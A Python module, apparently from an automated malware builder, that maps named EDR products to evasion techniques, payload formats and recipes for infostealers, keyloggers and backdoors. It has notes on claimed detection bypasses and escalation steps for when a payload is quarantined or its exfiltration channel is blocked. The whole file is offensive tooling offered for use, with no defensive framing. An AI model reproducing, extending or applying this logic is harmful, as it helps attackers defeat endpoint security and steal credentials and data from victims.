"""Strategy tree — known-working approaches per EDR and escalation logic."""

import logging
from dataclasses import dataclass

from .classifier import FailureType
from .knowledge_db import KnowledgeDB

logger = logging.getLogger(__name__)

STRATEGY_TREE: dict[str, dict] = {
    "crowdstrike": {
        "primary": "jscript",
        "secondary": "pe_with_resources",
        "avoid": [
            "powershell_addtype",
            "unsigned_pe_no_resources",
            "self_signed_pe",
            "adsisearcher",
        ],
        "evasion_layers": [
            "evasion/anti_debug",
            "evasion/anti_sandbox",
            "evasion/deferred_exec",
            "evasion/behavioral_pacing",
            "evasion/sleep_jitter",
        ],
        "notes": (
            "CS ML-scores PE on Rich header, imports, entropy, resources, signature. "
            "MinGW PE without resources = instant quarantine. Self-signed PE = quarantined. "
            "JScript via cscript.exe is trusted — proven bypass with 0 detections. "
            "PE with version info + manifest passes ML scoring."
        ),
        "recipes": {
            "infostealer": ["js_infostealer_full", "js_infostealer_stealth", "infostealer_edr_v2"],
            "keylogger": ["js_keylogger", "js_keylogger_stealth", "keylogger_edr_bypass"],
            "backdoor": ["js_backdoor_http", "js_backdoor_stealth", "backdoor_tcp_full_evasion"],
            "recon": ["js_recon_quick", "js_infostealer_staged"],
        },
        "escalation": {
            "pe_quarantined": ["switch_to_jscript", "add_resources", "use_dll_sideload"],
            "process_blocked": ["avoid_powershell", "use_cmd_lolbins", "change_process_name"],
            "behavioral": ["slow_beacon_interval", "add_decoy_traffic", "change_api_patterns"],
        },
    },
    "defender": {
        "primary": "pe_evasion",
        "secondary": "jscript",
        "avoid": [
            "amsi_patch_static",
            "pe_no_evasion",
            "powershell_raw",
        ],
        "evasion_layers": [
            "evasion/etw_patch",
            "evasion/sleep_encrypt",
            "evasion/indirect_syscall",
            "evasion/anti_debug",
            "evasion/anti_sandbox",
            "evasion/header_stomp",
            "evasion/deferred_exec",
        ],
        "notes": (
            "Defender uses AMSI for scripts, static sigs for PE. "
            "Evasion chunks (ETW patch, sleep encrypt, indirect syscalls) bypass effectively. "
            "PE without evasion = detected by static sigs. "
            "JScript is a viable secondary — Defender's AMSI scanning can be dodged with obfuscation."
        ),
        "recipes": {
            "infostealer": ["infostealer_edr_v2", "infostealer_ghost", "js_infostealer_full"],
            "keylogger": ["keylogger_edr_bypass", "keylogger_max_evasion", "js_keylogger_stealth"],
            "backdoor": ["backdoor_tcp_full_evasion", "backdoor_tcp_max_evasion", "js_backdoor_stealth"],
            "recon": ["js_recon_quick", "infostealer_staged"],
        },
        "escalation": {
            "pe_quarantined": [
                "increase_obfuscation",
                "change_string_encoding",
                "add_api_hashing",
                "restructure_execution_flow",
                "switch_to_jscript",
            ],
            "amsi_blocked": ["avoid_powershell", "use_cmd_lolbins", "split_staged_execution"],
            "behavioral": [
                "add_jitter_delays",
                "reorder_collectors",
                "change_api_patterns",
                "change_exfil_method",
            ],
            "no_c2": ["check_firewall", "try_dns_exfil", "try_http_exfil", "try_file_drop"],
        },
    },
    "elastic": {
        "primary": "pe_evasion",
        "secondary": "jscript",
        "avoid": [
            "known_callback_abuse",
            "direct_syscall",
        ],
        "evasion_layers": [
            "evasion/indirect_syscall",
            "evasion/behavioral_pacing",
            "evasion/sleep_encrypt",
            "evasion/anti_debug",
            "evasion/anti_sandbox",
            "evasion/ret_spoof",
            "evasion/deferred_exec",
        ],
        "notes": (
            "Elastic monitors syscalls and callback patterns. "
            "Behavioral pacing + indirect syscalls effective. "
            "Return-address spoofing helps avoid call-stack heuristics. "
            "Avoid well-known callback-abuse patterns (EnumWindows, CertEnumSystemStore)."
        ),
        "recipes": {
            "infostealer": ["infostealer_edr_v2", "infostealer_ghost", "js_infostealer_stealth"],
            "keylogger": ["keylogger_edr_bypass", "keylogger_elastic_bypass", "js_keylogger_stealth"],
            "backdoor": ["backdoor_tcp_elastic_bypass", "backdoor_tcp_full_evasion", "js_backdoor_stealth"],
            "recon": ["js_recon_quick", "infostealer_staged"],
        },
        "escalation": {
            "pe_quarantined": [
                "increase_obfuscation",
                "add_entropy_padding",
                "stomp_pe_headers",
                "switch_to_jscript",
            ],
            "behavioral": ["patch_etw", "unhook_ntdll", "add_indirect_syscalls"],
        },
    },
    "none": {
        "primary": "pe_basic",
        "secondary": "jscript",
        "avoid": [],
        "evasion_layers": [],
        "notes": "No EDR — any format works. Use basic recipes for speed.",
        "recipes": {
            "infostealer": ["infostealer_full", "js_infostealer_full"],
            "keylogger": ["keylogger", "js_keylogger"],
            "backdoor": ["backdoor_tcp_api", "js_backdoor_http"],
            "recon": ["js_recon_quick", "infostealer_staged"],
        },
        "escalation": {},
    },
}


@dataclass
class StrategyDecision:
    format_type: str
    recipe: str
    evasion_layers: list[str]
    rationale: str
    confidence: float
    needs_llm: bool = False


class StrategyTree:
    def __init__(self):
        self.tree = STRATEGY_TREE

    def get_strategy(self, edr: str) -> dict:
        return self.tree.get(edr.lower(), self.tree["none"])

    def get_recommended_recipe(self, edr: str, malware_type: str) -> str:
        strategy = self.get_strategy(edr)
        recipes = strategy.get("recipes", {}).get(malware_type.lower(), [])
        if recipes:
            return recipes[0]
        all_recipes = strategy.get("recipes", {})
        for recipes_list in all_recipes.values():
            if recipes_list:
                return recipes_list[0]
        return "infostealer_full"

    def get_recommended_recipes(self, edr: str, malware_type: str) -> list[str]:
        strategy = self.get_strategy(edr)
        return list(strategy.get("recipes", {}).get(malware_type.lower(), []))

    def get_evasion_layers(self, edr: str) -> list[str]:
        return list(self.get_strategy(edr).get("evasion_layers", []))

    def should_avoid(self, edr: str, pattern: str) -> bool:
        return pattern.lower() in [a.lower() for a in self.get_strategy(edr).get("avoid", [])]

    def summary(self, edr: str) -> str:
        s = self.get_strategy(edr)
        lines = [
            f"EDR: {edr}",
            f"Primary format: {s['primary']}",
            f"Secondary format: {s['secondary']}",
            f"Avoid: {', '.join(s['avoid']) or 'nothing'}",
            f"Evasion layers: {', '.join(s['evasion_layers']) or 'none needed'}",
            f"Notes: {s['notes']}",
        ]
        recipes = s.get("recipes", {})
        for mtype, rlist in recipes.items():
            lines.append(f"  {mtype} recipes: {', '.join(rlist)}")
        return "\n".join(lines)


def pick_format(edr: str, malware_type: str, db: KnowledgeDB) -> str:
    proven = db.get_proven_for(edr, malware_type)
    if proven:
        last_proven = proven[-1]
        fmt = last_proven.split(":")[0]
        return fmt

    strategy = STRATEGY_TREE.get(edr.lower(), STRATEGY_TREE["none"])
    primary = strategy["primary"]
    if primary in ("jscript", "pe_basic"):
        return "jscript" if primary == "jscript" else "c"
    return "c"


def pick_recipe(format_type: str, malware_type: str, edr: str, db: KnowledgeDB) -> str:
    proven = db.get_proven_for(edr, malware_type)
    for p in reversed(proven):
        parts = p.split(":")
        if parts[0] == format_type:
            return parts[1]

    tree = StrategyTree()
    recipes = tree.get_recommended_recipes(edr, malware_type)
    for r in recipes:
        is_js = r.startswith("js_")
        if format_type == "jscript" and is_js:
            return r
        if format_type == "c" and not is_js:
            return r
    if recipes:
        return recipes[0]

    fallback = {
        ("jscript", "infostealer"): "js_infostealer_stealth",
        ("jscript", "keylogger"): "js_keylogger_stealth",
        ("jscript", "backdoor"): "js_backdoor_stealth",
        ("c", "infostealer"): "infostealer_full",
        ("c", "keylogger"): "keylogger",
        ("c", "backdoor"): "backdoor_tcp_api",
    }
    return fallback.get((format_type, malware_type), f"js_{malware_type}_stealth")


def get_escalation_actions(failure_type: FailureType, edr: str, attempt: int) -> list[str]:
    edr_key = edr.lower().replace(" ", "")
    strategy = STRATEGY_TREE.get(edr_key, STRATEGY_TREE.get("defender", {}))
    escalation = strategy.get("escalation", {})

    ft_key = failure_type.value.lower()
    actions = escalation.get(ft_key, [])

    if not actions:
        actions = [
            "increase_obfuscation",
            "change_exfil_method",
            "switch_format",
            "restructure_execution_flow",
        ]

    if attempt < len(actions):
        return actions[attempt : attempt + 2]
    return actions[-2:]


def build_initial_strategy(malware_type: str, edr: str, db: KnowledgeDB) -> StrategyDecision:
    fmt = pick_format(edr, malware_type, db)
    recipe = pick_recipe(fmt, malware_type, edr, db)
    proven = db.get_proven_for(edr, malware_type)

    if proven:
        last = proven[-1]
        evasion = last.split(":")[-1].split(",") if ":" in last else []
        return StrategyDecision(
            format_type=fmt,
            recipe=recipe,
            evasion_layers=evasion,
            rationale=f"Using proven recipe from knowledge DB ({len(proven)} prior successes)",
            confidence=0.9,
        )

    tree = StrategyTree()
    evasion = tree.get_evasion_layers(edr)

    return StrategyDecision(
        format_type=fmt,
        recipe=recipe,
        evasion_layers=evasion,
        rationale=f"No prior knowledge for {edr}+{malware_type}, using defaults with {fmt}",
        confidence=0.5,
        needs_llm=True,
    )
